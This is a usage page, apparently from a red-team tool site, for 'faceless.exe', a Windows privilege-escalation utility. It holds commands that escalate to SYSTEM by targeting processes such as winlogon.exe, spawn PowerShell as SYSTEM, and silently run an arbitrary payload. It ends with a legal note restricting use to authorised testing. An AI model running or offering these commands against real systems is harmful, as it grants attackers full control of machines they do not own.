---
title: "Usage"
description: "Quick command reference and general flow."
tags: ["usage", "cli"]
order: 6
lastUpdated: 2026-02-06
---

## Quick reference

```bash
faceless.exe --help              # Show help
faceless.exe list                # List all processes
faceless.exe list explorer       # Filter by name
faceless.exe --system            # Auto-escalate to SYSTEM
faceless.exe -p 1234             # Target specific PID
faceless.exe -n winlogon.exe     # Target by name
faceless.exe --system -q         # Silent mode
```

## Examples

Escalate to SYSTEM:

```bash
faceless.exe --system
```

Execute PowerShell as SYSTEM:

```bash
faceless.exe --system -c powershell.exe
```

Run a custom payload silently:

```bash
faceless.exe --system -c "C:\payload.exe" -q
```

Process enumeration:

```bash
faceless.exe list
```

Expected output:

```
================================================================================
     PID | Process                      | Owner
================================================================================
     668 | winlogon.exe                 | NT AUTHORITY\SYSTEM
     712 | services.exe                 | NT AUTHORITY\SYSTEM
    9180 | explorer.exe                 | DESKTOP\User
================================================================================
```

## CLI options

| Option | Description |
|--------|-------------|
| `list [filter]` | Enumerate processes (optional name filter) |
| `-p, --pid <PID>` | Target by PID |
| `-n, --name <name>` | Target by name |
| `--system` | Auto-target SYSTEM process |
| `-c, --cmd <command>` | Command to execute (default `cmd.exe`) |
| `-q, --quiet` | Suppress output |
| `-h, --help` | Show help |

## Recommended flow

1. Enumerate processes and validate context.
2. Select authorized target (PID or name).
3. Use quiet mode when appropriate.

## Legal note

- Use these options only on systems you own or have written permission to test.

## See also

- [Installation](/en/arsenal/faceless/setup)
- [OPSEC](/en/arsenal/faceless/opsec)
